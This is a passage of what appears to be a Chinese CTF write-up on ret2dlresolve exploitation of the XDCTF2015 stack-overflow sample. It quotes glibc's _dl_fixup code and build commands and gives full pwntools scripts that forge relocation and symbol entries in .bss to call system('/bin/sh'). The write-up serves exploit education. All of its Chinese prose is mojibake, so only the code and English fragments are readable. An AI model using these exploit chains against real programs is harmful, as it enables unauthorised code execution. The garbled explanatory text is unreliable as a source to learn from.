ç‰ˆæœ¬ä¿¡æ¯æ•°ç»„åœ¨l_infoé‡Œ, ä½¿ç”¨<code>VERSYMIDX (DT_VERSYM)</code>å®è¿›è¡Œå®šä½, ä»ç„¶åˆ©ç”¨é‡å®šä½æ¡ç›®ä¸­çš„ç¬¦å·è¡¨ç¼–å·ä½œä¸ºversnumç´¢å¼•, å–å‡ºç»“æ„ä½“åœ°å€, ç„¶åè®¿é—®version-&gt;hash, å¦‚æœç¬¦å·è¡¨ä¸‹æ ‡è®¾ç½®çš„å¤ªå¤§åˆ™è®¿é—®hashæ—¶å¯èƒ½ä¼šè¶…å‡ºå†…å­˜æ˜ å°„èŒƒå›´å¯¼è‡´segment fault. å¦‚æœversionè¢«ç½®NULL, è§£æä¹Ÿèƒ½é€šè¿‡. </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">r_found_version</span> *<span class="hljs-title">version</span> =</span> <span class="hljs-literal">NULL</span>;<br>   <br><span class="hljs-keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="hljs-literal">NULL</span>)<br>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">const</span> <span class="hljs-title">ElfW</span><span class="hljs-params">(Half)</span> *vernum </span>= (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);<br>    ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="hljs-number">0x7fff</span>;<br>    version = &amp;l-&gt;l_versions[ndx];<br>    <span class="hljs-keyword">if</span> (version-&gt;hash == <span class="hljs-number">0</span>)<br>        version = <span class="hljs-literal">NULL</span>;<br>&#125;<br>   <br>result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,<br>                              version, ELF_RTYPE_CLASS_PLT, flags, <span class="hljs-literal">NULL</span>);<br>   <br>value = sym ? (LOOKUP_VALUE_ADDRESS (result)<br>               + sym-&gt;st_value) : <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure></li><li><p>å¦åˆ™ç”±äºst_otheræè¿°ç¬¦å·çš„å¯è§æ€§ï¼Œå¦‚æœåŒ…å«STV_PROTECTEDã€STV_HIDDENå’ŒSTV_INTERNALçš„å…¶ä¸­ä»»ä½•ä¸€ç§ï¼Œåˆ™ç›´æ¥å°†è£…è½½åœ°å€åŠ ä¸Šst_valueå³å¾—åˆ°å‡½æ•°çš„æœ€ç»ˆåœ°å€valueï¼Œå°†å…¶å†™å…¥rel_addrå³å¯ã€‚</p></li><li><p>åœ¨åŠ¨æ€é“¾æ¥åº“æŸ¥æ‰¾è¿™ä¸ªå‡½æ•°çš„åœ°å€ï¼Œå¹¶ä¸”æŠŠåœ°å€èµ‹å€¼ç»™<code>*rel-&gt;r_offset</code>ï¼Œå³GOTè¡¨</p></li><li><p>è°ƒç”¨è¿™ä¸ªå‡½æ•°</p></li></ol><h3 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><blockquote><ul><li>No RELRO - Link Mapã€GOT å¯å†™, <code>.dynamic</code>å¯å†™</li><li>Partial RELRO - Link Map ä¸å¯å†™ã€GOT å¯å†™, <code>.dynamic</code>ä¸å¯å†™ </li><li>Full RELRO - å…¨ä¸å¯å†™</li></ul></blockquote><p>åˆ†æˆå››ç§æƒ…å†µ:</p><ul><li>32, No RELRO</li><li>32, Patial RELRO</li><li>64, No RELRO</li><li>64, Patial RELRO</li></ul><p>ä¸‹é¢æ¯ä¸€ç§éƒ½åˆ†æˆæ‰‹åŠ¨å’Œå·¥å…·ä¸¤éƒ¨åˆ†:</p><p>ç¤ºä¾‹ä»£ç æºç , éå¸¸ç®€å•çš„æ ˆæº¢å‡º. </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">vuln</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">100</span>];<br>    setbuf(<span class="hljs-built_in">stdin</span>, buf);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">256</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">100</span>] = <span class="hljs-string">&quot;Welcome to XDCTF2015~!\n&quot;</span>;<br><br>    setbuf(<span class="hljs-built_in">stdout</span>, buf);<br>    write(<span class="hljs-number">1</span>, buf, <span class="hljs-built_in">strlen</span>(buf));<br>    vuln();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="32-No-RELRO"><a href="#32-No-RELRO" class="headerlink" title="32, No RELRO"></a>32, No RELRO</h4><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">gcc -fno-stack-protector -m32 -z norelro -no-pie pwn5.c -o norelro_32<br></code></pre></div></td></tr></table></figure><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¿®æ”¹ <code>.dynamic</code> ä¼šç®€å•äº›ã€‚å› ä¸ºæˆ‘ä»¬åªéœ€è¦ä¿®æ”¹ <code>.dynamic</code> èŠ‚ä¸­çš„å­—ç¬¦ä¸²è¡¨çš„åœ°å€ä¸ºä¼ªé€ çš„å­—ç¬¦ä¸²è¡¨çš„åœ°å€ï¼Œå¹¶ä¸”ç›¸åº”çš„ä½ç½®ä¸ºç›®æ ‡å­—ç¬¦ä¸²åŸºæœ¬å°±è¡Œäº†ã€‚å…·ä½“æ€è·¯å¦‚ä¸‹</p><ol><li>ä¿®æ”¹ .dynamic èŠ‚ä¸­å­—ç¬¦ä¸²è¡¨çš„åœ°å€ä¸ºä¼ªé€ çš„åœ°å€</li><li>åœ¨ä¼ªé€ çš„åœ°å€å¤„æ„é€ å¥½å­—ç¬¦ä¸²è¡¨ï¼Œå°† read å­—ç¬¦ä¸²æ›¿æ¢ä¸º system å­—ç¬¦ä¸²ã€‚</li><li>åœ¨ç‰¹å®šçš„ä½ç½®è¯»å– /bin/sh å­—ç¬¦ä¸²ã€‚</li><li>è°ƒç”¨ read å‡½æ•°çš„ plt çš„ç¬¬äºŒæ¡æŒ‡ä»¤ï¼Œè§¦å‘ <code>_dl_runtime_resolve</code> è¿›è¡Œå‡½æ•°è§£æï¼Œä»è€Œæ‰§è¡Œ system å‡½æ•°ã€‚</li></ol><h4 id="32-Partial-RELRO"><a href="#32-Partial-RELRO" class="headerlink" title="32, Partial RELRO"></a>32, Partial RELRO</h4><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">gcc -fno-stack-protector -m32 -z relro -z lazy -no-pie pwn5.c -o partial_relro_32<br></code></pre></div></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™.dynamicä¸å¯å†™, äºæ˜¯æˆ‘ä»¬éœ€è¦æ„é€ æ•´ä¸ªéœ€è¦çš„ä¿¡æ¯é“¾æ¡, è€Œ: (å†å†™ä¸€éåŠ æ·±å°è±¡)</p><ol><li>dlresolveå‡½æ•°ç¬¬äºŒä¸ªå‚æ•°è¡¨ç¤ºé‡å®šä½æ¡ç›®åœ¨.rel.pltä¸­çš„åç§»</li><li>.rel.pltä¸­æœ‰ç¬¦å·åœ¨.dyntabä¸­çš„ç´¢å¼•</li><li>.dyntabæœ‰ç¬¦å·åç§°åœ¨.dynsträ¸­çš„åç§»</li><li>åˆ©ç”¨åç§»æ‰¾åˆ°ç¬¦å·åå­—ç¬¦ä¸², ç„¶ååˆ©ç”¨åç§°æ‰¾åˆ°å…¶åœ°å€(è§£ææ‰€è¦åšçš„äº‹æƒ…), æ‰¾åˆ°åä¿®æ”¹GOTæ¡ç›®, ç„¶åè°ƒç”¨æ­¤å‡½æ•°</li></ol><p>ä»è€Œå¾—çŸ¥éœ€è¦ä¸€æ­¥æ­¥æ„é€ 1-3æ‰€è¡¨ç¤ºçš„é“¾æ¡. ä¸‹é¢æ¯ä¸ªstageæ¨¡ä»¿Wiki.</p><ol><li>é¦–å…ˆå®ç°æ ˆè½¬ç§». åˆ©ç”¨åŸæœ¬çš„pltæœºåˆ¶æ‰§è¡Œwriteå‡½æ•°</li><li>åœ¨ä¸Šä¸€ä¸ªåŸºç¡€ä¸Š, æ‰‹åŠ¨æ‰¾åˆ°writeåœ¨.rel.pltä¸­çš„åç§», å‹å…¥æ ˆå½“åšå‚æ•°, ç›´æ¥è°ƒç”¨ä½äºplt0çš„dlresolve()</li><li>åœ¨ä¸Šä¸€ä¸ªåŸºç¡€ä¸Š, åœ¨bssæ®µä¼ªé€ .rel.plté¡¹(å³<code>Elf32_Rel</code>), å†…å®¹å’ŒçœŸå®çš„writeé‡å®šä½é¡¹ç›¸åŒ, ç„¶åæŠŠå‚æ•°æ”¹æˆ<code>.rel.plt</code>åˆ°è¿™ä¸€ä¸ªé¡¹çš„åç§». </li><li>åœ¨ä¸Šä¸€ä¸ªåŸºç¡€ä¸Š, é‡å®šä½é¡¹å†…å®¹infoç¬¦å·è¡¨åç§»æ”¹æˆåœ¨bssæ®µä¸­, é¡ºä¾¿ä¼ªé€ ä¸€ä¸‹ç¬¦å·è¡¨ <del>å’Œç¬¦å·åç§°å­—ç¬¦ä¸²</del>.<br>ä½†æ˜¯åªåšè¿™äº›<mark>æœ‰å¯èƒ½</mark>å¯¼è‡´version-&gt;hashè¶…å‡ºå†…å­˜èŒƒå›´. è€Œåœ¨åŠ¨æ€è§£æç¬¦å·åœ°å€çš„è¿‡ç¨‹ä¸­ï¼Œ<strong>å¦‚æœ version ä¸º NULL çš„è¯ï¼Œä¹Ÿä¼šæ­£å¸¸è§£æç¬¦å·ã€‚</strong>ä¸æ­¤åŒæ—¶, å¯ä»¥çŸ¥é“ l_versions çš„å‰ä¸¤ä¸ªå…ƒç´ ä¸­çš„ hash å€¼éƒ½ä¸º 0ï¼Œå› æ­¤å¦‚æœæˆ‘ä»¬ä½¿å¾— ndx ä¸º 0 æˆ–è€… 1 æ—¶ï¼Œå°±å¯ä»¥æ»¡è¶³è¦æ±‚.<br>ç”±äºç¬¦å·åœ°å€æŸ¥æ‰¾ä½¿ç”¨çš„å®<code>DL_FIXUP_MAKE_VALUE</code>éœ€è¦ä½¿ç”¨ç¬¦å·æ‰€åœ¨çš„linkmapåŠ ä¸Šç¬¦å·åç§»æ‰¾åˆ°å…¶åœ°å€, libcå‡½æ•°è‡ªç„¶å°±éœ€è¦libcä¸­çš„linkmap, æ‰€ä»¥åªèƒ½è¿›å…¥ifè¯­å¥å°è¯•ç»•è¿‡version-&gt;hashçš„è®¿é—®ä»¥åŠversionçš„æ¯”å¯¹.<br>åœ¨æœ¬åœ°kali2022ç¯å¢ƒä¸‹ndxæ­£å¥½æ˜¯0, æ— éœ€æ‹…å¿ƒ. </li></ol><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.binary = elf = ELF(<span class="hljs-string">&#x27;./partial_relro_32&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>r = process(<span class="hljs-string">&#x27;./partial_relro_32&#x27;</span>)<br>rop = ROP(<span class="hljs-string">&#x27;./partial_relro_32&#x27;</span>)<br><br>offset = <span class="hljs-number">112</span><br>bss_addr = elf.bss()<br><br>r.recvuntil(<span class="hljs-string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)<br><br><span class="hljs-comment"># stack privot to bss segment, set esp = base_stage</span><br>base = bss_addr + <span class="hljs-number">0x800</span><br>rop.raw(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">112</span>)<br>rop.read(<span class="hljs-number">0</span>, base, <span class="hljs-number">100</span>)<br>rop.migrate(base)<br>r.sendline(rop.chain())<br><br>rop = ROP(<span class="hljs-string">&#x27;./partial_relro_32&#x27;</span>)<br>sh = <span class="hljs-string">&#x27;/bin/sh&#x27;</span><br><br>plt = elf.get_section_by_name(<span class="hljs-string">&#x27;.plt&#x27;</span>).header.sh_addr<br>rel_plt = elf.get_section_by_name(<span class="hljs-string">&#x27;.rel.plt&#x27;</span>).header.sh_addr<br>dynsym = elf.get_section_by_name(<span class="hljs-string">&#x27;.dynsym&#x27;</span>).header.sh_addr<br>dynstr = elf.get_section_by_name(<span class="hljs-string">&#x27;.dynstr&#x27;</span>).header.sh_addr<br><br>fake_sym_addr = base + <span class="hljs-number">32</span><br>align_addend = <span class="hljs-number">0x10</span> - (fake_sym_addr - dynsym) &amp; <span class="hljs-number">0xf</span><br>fake_sym_addr += align_addend<br><span class="hljs-comment"># first arg is the offset by fake_dynstr table in rop chain</span><br>fake_write_sym = flat([<span class="hljs-number">0x42</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x12</span>])<br><br>rel_r_offset = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>dynsym_idx = <span class="hljs-built_in">int</span>((fake_sym_addr - dynsym) / <span class="hljs-number">0x10</span>)<br>rel_r_info = (dynsym_idx &lt;&lt; <span class="hljs-number">8</span>) | <span class="hljs-number">0x07</span><br>fake_write_reloc = flat([rel_r_offset, rel_r_info])<br>rel_offset = base + <span class="hljs-number">24</span> - rel_plt<br><br>gnu_version_addr = elf.get_section_by_name(<span class="hljs-string">&#x27;.gnu.version&#x27;</span>).header.sh_addr<br>log.success(<span class="hljs-string">&quot;ndx_addr: %s&quot;</span> % <span class="hljs-built_in">hex</span>(gnu_version_addr+dynsym_idx*<span class="hljs-number">2</span>))<br><br>sh = <span class="hljs-string">&#x27;/bin/sh&#x27;</span><br>rop.raw(plt)<br>rop.raw(rel_offset)<br>rop.raw(<span class="hljs-string">&#x27;bbbb&#x27;</span>)  <span class="hljs-comment"># fake ret address of write</span><br>rop.raw(<span class="hljs-number">1</span>)<br>rop.raw(base + <span class="hljs-number">80</span>)<br>rop.raw(<span class="hljs-built_in">len</span>(sh))<br><span class="hljs-comment"># base + 24</span><br>rop.raw(fake_write_reloc)<br><span class="hljs-comment"># base + 32</span><br>rop.raw(<span class="hljs-string">b&#x27;b&#x27;</span>*align_addend)<br>rop.raw(fake_write_sym)<br>rop.raw(<span class="hljs-string">b&#x27;b&#x27;</span> * (<span class="hljs-number">80</span> - <span class="hljs-built_in">len</span>(rop.chain())))<br>rop.raw(sh)<br>rop.raw(<span class="hljs-string">b&#x27;b&#x27;</span> * (<span class="hljs-number">100</span> - <span class="hljs-built_in">len</span>(rop.chain())))<br><br><br>gdb.attach(r)<br>r.sendline(rop.chain())<br>r.interactive()<br></code></pre></div></td></tr></table></figure><ol start="5"><li>æˆ‘ä»¬åªéœ€è¦å°†åŸå…ˆçš„ write å­—ç¬¦ä¸²ä¿®æ”¹ä¸º system å­—ç¬¦ä¸²ï¼ŒåŒæ—¶ä¿®æ”¹ write çš„å‚æ•°ä¸º system çš„å‚æ•°å³å¯è·å– shellã€‚</li></ol><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.binary = elf = ELF(<span class="hljs-string">&#x27;./partial_relro_32&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>r = process(<span class="hljs-string">&#x27;./partial_relro_32&#x27;</span>)<br>rop = ROP(<span class="hljs-string">&#x27;./partial_relro_32&#x27;</span>)<br><br>offset = <span class="hljs-number">112</span><br>bss_addr = elf.bss()<br><br>r.recvuntil(<span class="hljs-string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)<br><br><span class="hljs-comment"># stack privot to bss segment, set esp = base_stage</span><br>base = bss_addr + <span class="hljs-number">0x800</span><br>rop.raw(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">112</span>)<br>rop.read(<span class="hljs-number">0</span>, base, <span class="hljs-number">100</span>)<br>rop.migrate(base)<br>r.sendline(rop.chain())<br><br>rop = ROP(<span class="hljs-string">&#x27;./partial_relro_32&#x27;</span>)<br>sh = <span class="hljs-string">&#x27;/bin/sh&#x27;</span><br><br>plt = elf.get_section_by_name(<span class="hljs-string">&#x27;.plt&#x27;</span>).header.sh_addr<br>rel_plt = elf.get_section_by_name(<span class="hljs-string">&#x27;.rel.plt&#x27;</span>).header.sh_addr<br>dynsym = elf.get_section_by_name(<span class="hljs-string">&#x27;.dynsym&#x27;</span>).header.sh_addr<br>dynstr = elf.get_section_by_name(<span class="hljs-string">&#x27;.dynstr&#x27;</span>).header.sh_addr<br><br>fake_sym_addr = base + <span class="hljs-number">32</span><br>align_addend = <span class="hljs-number">0x10</span> - (fake_sym_addr - dynsym) &amp; <span class="hljs-number">0xf</span><br>fake_sym_addr += align_addend<br>st_name = fake_sym_addr + <span class="hljs-number">0x10</span> - dynstr<br><span class="hljs-comment"># first arg is the offset by fake_dynstr table in rop chain</span><br>fake_write_sym = flat([st_name, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x12</span>])<br><br>rel_r_offset = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>dynsym_idx = <span class="hljs-built_in">int</span>((fake_sym_addr - dynsym) / <span class="hljs-number">0x10</span>)<br>rel_r_info = (dynsym_idx &lt;&lt; <span class="hljs-number">8</span>) | <span class="hljs-number">0x07</span><br>fake_write_reloc = flat([rel_r_offset, rel_r_info])<br>rel_offset = base + <span class="hljs-number">24</span> - rel_plt<br><br>gnu_version_addr = elf.get_section_by_name(<span class="hljs-string">&#x27;.gnu.version&#x27;</span>).header.sh_addr<br>log.success(<span class="hljs-string">&quot;ndx_addr: %s&quot;</span> % <span class="hljs-built_in">hex</span>(gnu_version_addr+dynsym_idx*<span class="hljs-number">2</span>))<br><br>sh = <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span><br>rop.raw(plt)<br>rop.raw(rel_offset)<br>rop.raw(<span class="hljs-string">&#x27;bbbb&#x27;</span>)  <span class="hljs-comment"># fake ret address of write</span><br><span class="hljs-comment"># rop.raw(1)</span><br>rop.raw(base + <span class="hljs-number">80</span>)<br><span class="hljs-comment"># rop.raw(len(sh))</span><br>rop.raw(<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">24</span>-<span class="hljs-built_in">len</span>(rop.chain())))<br><span class="hljs-comment"># base + 24</span><br>rop.raw(fake_write_reloc)<br><span class="hljs-comment"># base + 32</span><br>rop.raw(<span class="hljs-string">b&#x27;b&#x27;</span>*align_addend)<br>rop.raw(fake_write_sym)<br>rop.raw(<span class="hljs-string">b&#x27;system\x00&#x27;</span>)<br>rop.raw(<span class="hljs-string">b&#x27;b&#x27;</span> * (<span class="hljs-number">80</span> - <span class="hljs-built_in">len</span>(rop.chain())))<br>rop.raw(sh)<br>rop.raw(<span class="hljs-string">b&#x27;b&#x27;</span> * (<span class="hljs-number">100</span> - <span class="hljs-built_in">len</span>(rop.chain())))<br><br><br><span class="hljs-comment"># gdb.attach(r)</span><br>r.sendline(rop.chain())<br>r.interactive()<br></code></pre></div></td></tr></table></figure><p>åŸºäºå·¥å…·</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.binary = elf = ELF(<span class="hljs-string">&quot;./main_partial_relro_32&quot;</span>)<br>rop = ROP(context.binary)<br>dlresolve = Ret2dlresolvePayload(elf,symbol=<span class="hljs-string">&quot;system&quot;</span>,args=[<span class="hljs-string">&quot;/bin/sh&quot;</span>])<br><span class="hljs-comment"># pwntools will help us choose a proper addr</span><br><span class="hljs-comment"># https://github.com/Gallopsled/pwntools/blob/5db149adc2/pwnlib/rop/ret2dlresolve.py#L237</span><br>rop.read(<span class="hljs-number">0</span>,dlresolve.data_addr)<br>rop.ret2dlresolve(dlresolve)<br>raw_rop = rop.chain()<br>io = process(<span class="hljs-string">&quot;./main_partial_relro_32&quot;</span>)<br>io.recvuntil(<span class="hljs-string">&quot;Welcome to XDCTF2015~!\n&quot;</span>)<br>payload = flat(&#123;<span class="hljs-number">112</span>:raw_rop,<span class="hljs-number">256</span>:dlresolve.payload&#125;)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><h4 id="64-No-RELRO"><a href="#64-No-RELRO" class="headerlink" title="64, No RELRO"></a>64, No RELRO</h4><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç±»ä¼¼äº 32 ä½çš„æƒ…å†µç›´æ¥æ„é€ å³å¯ã€‚ç”±äºå¯ä»¥æº¢å‡ºçš„ç¼“å†²åŒºå¤ªå°‘ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è€ƒè™‘è¿›è¡Œæ ˆè¿ç§»åï¼Œç„¶åè¿›è¡Œæ¼æ´åˆ©ç”¨ã€‚</p><ol><li>åœ¨ bss æ®µä¼ªé€ æ ˆã€‚æ ˆä¸­çš„æ•°æ®ä¸º<ol><li>ä¿®æ”¹ .dynamic èŠ‚ä¸­å­—ç¬¦ä¸²è¡¨çš„åœ°å€ä¸ºä¼ªé€ çš„åœ°å€</li><li>åœ¨ä¼ªé€ çš„åœ°å€å¤„æ„é€ å¥½å­—ç¬¦ä¸²è¡¨ï¼Œå°† read å­—ç¬¦ä¸²æ›¿æ¢ä¸º system å­—ç¬¦ä¸²ã€‚</li><li>åœ¨ç‰¹å®šçš„ä½ç½®è¯»å– /bin/sh å­—ç¬¦ä¸²ã€‚</li><li>è°ƒç”¨ read å‡½æ•°çš„ plt çš„ç¬¬äºŒæ¡æŒ‡ä»¤ï¼Œè§¦å‘ <code>_dl_runtime_resolve</code> è¿›è¡Œå‡½æ•°è§£æï¼Œä»è€Œè§¦å‘æ‰§è¡Œ system å‡½æ•°ã€‚</li></ol></li><li>æ ˆè¿ç§»åˆ° bss æ®µã€‚</li></ol><p>ç¨‹åºä¸­æ²¡æœ‰ç›´æ¥è®¾ç½®rdxçš„gadget, æ‰€ä»¥ä½¿ç”¨äº†<code>__libc_csu_init</code> ä¸­çš„ä¸€å †gadget, å€Ÿç”¨äº†ret2csu. </p><p>è‡ªå·±å†™åˆé‡åˆ°ä¸€å †é—®é¢˜â€¦.</p><ul><li>csu_callé‡Œé¢æŠŠ0x10å†™æˆ0x16..</li><li>ä¸€å¼€å§‹è¿˜æŠŠä¼ªé€ çš„dynstrå’Œshå†™åœ¨ç¬¬äºŒä¸ªropé“¾çš„ä¸­é—´, è°ƒè¯•äº†ä¸€ä¼šå„¿æ‰å‘ç°è‡ªå·±æœ‰å¤šç¦»è°±. </li><li>ç„¶ååœ¨systemå‡½æ•°ä¸­çš„xmmæŒ‡ä»¤å‡ºé”™, åŸå› æ˜¯xmmwordå…³é”®å­—è¦æ±‚<code>rsp+0x40</code>16å­—èŠ‚å¯¹é½, äºæ˜¯å°†baseå¢åŠ 8å­—èŠ‚. </li></ul><blockquote><p>MOVAPSâ€”Move Aligned Packed Single-Precision Floating-Point Values</p><p><strong>XMMWORD</strong> is intended to represent the same type as m128.<br><strong>Variables of type</strong>  <code>__m128</code> are automatically aligned on 16-byte boundaries.</p></blockquote><ul><li>csu_callä¸­åŠ å…¥rbpçš„è®¾ç½®, åŸå› æ˜¯ç¬¬ä¸€æ¬¡readé™åˆ¶256å­—èŠ‚, ä¸€ä¸ªcsu_callåŠ ä¸Š120å­—èŠ‚å¡«å……å·²ç»240, <code>rop.migrate()</code>å·²ç»ä¸å¯ç”¨(è¿‡é•¿), åªå¥½åˆ©ç”¨csu_callç»“æŸæ—¶popçš„rbp, ç„¶åè·Ÿä¸Šä¸€ä¸ªleave_retå°±å¯ä»¥ç»§ç»­åˆ©ç”¨, å¦‚æœä¸éœ€è¦åˆ™å‡½æ•°ä¸­rbpä¸ºé»˜è®¤å€¼0. </li><li>ç„¶ååˆå‘ç°rbpç›´æ¥å¡«æˆbaseçš„å€¼æ˜¯ä¸è¡Œçš„, leaveæŒ‡ä»¤çš„æ‰§è¡Œé¡ºåºæ˜¯<code>mov rsp, rbp; pop rbp</code>, æ‰€ä»¥rspæˆåŠŸä¿®æ”¹ä¸ºrbpçš„å€¼åé©¬ä¸ŠåŠ ä¸Š0x8, æ‰€ä»¥ä¼ å…¥çš„rbpå€¼åº”ä¸ºæœŸæœ›rspå€¼å‡å»8. </li><li>å¤šæ¬¡ä½¿ç”¨read, æ³¨æ„sendlineé™„åŠ çš„æ¢è¡Œç¬¦å’Œreadçš„å­—èŠ‚æ•°é•¿åº¦. 